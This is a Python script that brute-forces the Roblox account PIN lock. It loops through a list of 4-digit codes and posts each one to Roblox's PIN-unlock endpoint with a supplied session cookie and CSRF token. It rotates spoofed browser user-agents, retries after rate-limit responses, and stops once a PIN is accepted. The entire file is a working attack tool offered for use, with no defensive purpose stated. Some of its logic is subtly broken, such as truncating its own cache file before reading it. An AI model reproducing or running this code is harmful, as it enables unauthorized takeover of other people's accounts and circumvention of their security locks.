import os
import requests
from requests.structures import CaseInsensitiveDict
import time
import sys
import random
from colorama import Back,Fore,init
init() #colorama initialize
cachedude = open("cache.txt","w")
cachedude2 = open("cache.txt","r")
ok = cachedude2.read().split("\n")
pins = open("4digitcodes.txt","r")
codes = pins.read().split("\n")
activated = False
print(Fore.YELLOW + "CREDITS TO SECLIST FOR 4 DIGIT CODES\nTo find your account's cookie and csrf token,\ncheck the README.md file in " + Fore.WHITE + "Github" + Fore.YELLOW + "\nfanks," + Fore.RED + "\nlove by 0x74ngly / Tangly\n" + Fore.WHITE + "-------------")
def convert(num):
    if num < 10:
        return f"000{num}"
    elif num < 100:
        return f"00{num}"
    elif num < 1000:
        return f"0{num}"
    else:
        return str(num)
if cachedude2.read() != "":
    def makerequest(pin,cookiepls,csrftoken,ospls):
        statustime = f"Tried {pin}"
        hehe = CaseInsensitiveDict()
        hehe["authority"] = "auth.roblox.com"
        hehe["method"] = "POST"
        hehe["path"] = "/v1/account/pin/unlock"
        hehe["scheme"] = "https"
        hehe["accept"] = "application/json, text/plain, */*"
        hehe["accept-encoding"] = "gzip, deflate, br"
        hehe["accept-language"] = "en-US,en;q=0.9"
        hehe["content-length"] = "8"
        hehe["content-type"] = "application/x-www-form-urlencoded"
        hehe["cookie"] = f"{cookiepls}"
        hehe["origin"] = "https://www.roblox.com"
        hehe["referer"] = "https://www.roblox.com/"
        hehe["sec-fetch-dest"] = "empty"
        hehe["sec-fetch-mode"] = "cors"
        hehe["sec-fetch-site"] = "same-site"
        if ospls == 1:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
        elif ospls == 2:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
        elif ospls == 3:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
        elif ospls == 4:
            hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
        elif ospls == 5:
            hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
        hehe["x-csrf-token"] = f"{csrftoken}"
        hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
        if hi.status_code == 429:
            #statustime = Fore.RED + "TOO MANY REQUESTS!" + Fore.WHITE + f"\nDelaying for {waittime}."
            print(Fore.YELLOW + "[!] Encountered 'Too many requests'" + Fore.WHITE + "\nWaiting...")
            time.sleep(float(waittime))
            makerequest(pin,cookiepls,csrftoken,ospls)
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 403:
            #statustime = Fore.GREEN + f"Tried {pin}" + Fore.WHITE
            print("Tried pin: " + Fore.RED + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 200:
            print("Tried pin: " + Fore.GREEN + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.GREEN + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
            sys.exit()
        else:
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
    def makerequesty(pin,cookie,xsrftoken,oss):
        statustime = f"Tried {pin}"
        hehe = CaseInsensitiveDict()
        hehe["authority"] = "auth.roblox.com"
        hehe["method"] = "POST"
        hehe["path"] = "/v1/account/pin/unlock"
        hehe["scheme"] = "https"
        hehe["accept"] = "application/json, text/plain, */*"
        hehe["accept-encoding"] = "gzip, deflate, br"
        hehe["accept-language"] = "en-US,en;q=0.9"
        hehe["content-length"] = "8"
        hehe["content-type"] = "application/x-www-form-urlencoded"
        hehe["cookie"] = f"{cookie}"
        hehe["origin"] = "https://www.roblox.com"
        hehe["referer"] = "https://www.roblox.com/"
        hehe["sec-fetch-dest"] = "empty"
        hehe["sec-fetch-mode"] = "cors"
        hehe["sec-fetch-site"] = "same-site"
        if oss == 1:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
        elif oss == 2:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
        elif oss == 3:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
        elif oss == 4:
            hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
        elif oss == 5:
            hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
        hehe["x-csrf-token"] = f"{xsrftoken}"
        hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
        if hi.status_code == 429:
            #statustime = Fore.RED + "TOO MANY REQUESTS!" + Fore.WHITE + f"\nDelaying for {waittime}."
            print(Fore.YELLOW + "[!] Encountered 'Too many requests'" + Fore.WHITE + "\nWaiting...")
            time.sleep(float(waittime))
            makerequesty(pin,cookie,xsrftoken,oss)
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 403:
            #statustime = Fore.GREEN + f"Tried {pin}" + Fore.WHITE
            print("Tried pin: " + Fore.RED + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 200:
            print("Tried pin: " + Fore.GREEN + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.GREEN + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
            sys.exit()
        else:
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
    option = input("Do you want to do the same account? [Y/N]: ")
    if option.lower() == "y":
        csrftoken = input("Enter csrf token here: ")
        waittime = input("(5 is recommended) How many seconds would the bruteforcer run each pin?: ")
        print("cool lets get this bad boy running now")
        activated = True
        for i in codes:
            time.sleep(float(waittime))
            makerequesty(convert(int(i)),ok[0],csrftoken,ok[1])
    elif option.lower() == "n":
        cookiepls = input("Enter account's cookie here: ")
        csrftoken = input("Enter csrf token here: ")
        ospls = input("""Operating System Choices
-------------------------
+ Windows
    [1] 10 (Chrome, works with Brave)
    [2] 10 (Firefox) <-- not 100% working
    [3] 7 <-- not tested
[4] Linux <-- not tested
[5] Mac OS <-- not tested
Option: """)
        cachedude.write(f"{cookiepls}\n{ospls}")
        cachedude.close()
        waittime = input("(5 is recommended) How many seconds would the bruteforcer run each pin?: ")
        print("cool lets get this bad boy running now")
        activated = True
        for i in codes:   
            time.sleep(float(waittime))
            makerequest(convert(int(i)),cookiepls,csrftoken,ospls)
else:
    def makerequest(pin,cookiepls,csrftoken,ospls):
        statustime = f"Tried {pin}"
        hehe = CaseInsensitiveDict()
        hehe["authority"] = "auth.roblox.com"
        hehe["method"] = "POST"
        hehe["path"] = "/v1/account/pin/unlock"
        hehe["scheme"] = "https"
        hehe["accept"] = "application/json, text/plain, */*"
        hehe["accept-encoding"] = "gzip, deflate, br"
        hehe["accept-language"] = "en-US,en;q=0.9"
        hehe["content-length"] = "8"
        hehe["content-type"] = "application/x-www-form-urlencoded"
        hehe["cookie"] = f"{cookiepls}"
        hehe["origin"] = "https://www.roblox.com"
        hehe["referer"] = "https://www.roblox.com/"
        hehe["sec-fetch-dest"] = "empty"
        hehe["sec-fetch-mode"] = "cors"
        hehe["sec-fetch-site"] = "same-site"
        if ospls == 1:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
        elif ospls == 2:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
        elif ospls == 3:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
        elif ospls == 4:
            hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
        elif ospls == 5:
            hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
        hehe["x-csrf-token"] = f"{csrftoken}"
        hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
        if hi.status_code == 429:
            #statustime = Fore.RED + "TOO MANY REQUESTS!" + Fore.WHITE + f"\nDelaying for {waittime}."
            print(Fore.YELLOW + "[!] Encountered 'Too many requests'" + Fore.WHITE + "\nWaiting...")
            time.sleep(float(waittime))
            makerequest(pin,cookiepls,csrftoken,ospls)
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 403:
            #statustime = Fore.GREEN + f"Tried {pin}" + Fore.WHITE
            print("Tried pin: " + Fore.RED + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 200:
            print("Tried pin: " + Fore.GREEN + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.GREEN + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
            sys.exit()
        else:
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
    cookiepls = input("Enter account's cookie here: ")
    csrftoken = input("Enter csrf token here: ")
    ospls = input("""Operating System Choices
-------------------------
+ Windows
    [1] 10 (Chrome, works with Brave)
    [2] 10 (Firefox) <-- not 100% working
    [3] 7 <-- not tested
[4] Linux <-- not tested
[5] Mac OS <-- not tested
Option: """)
    cachedude.write(f"{cookiepls}\n{ospls}")
    cachedude.close()
    waittime = input("(2 is recommended) How many seconds would the bruteforcer run each pin?: ")
    print("cool lets get this bad boy running now")
    activated = True
    for i in codes: 
        time.sleep(float(waittime))
        makerequest(convert(int(i)),cookiepls,csrftoken,ospls)
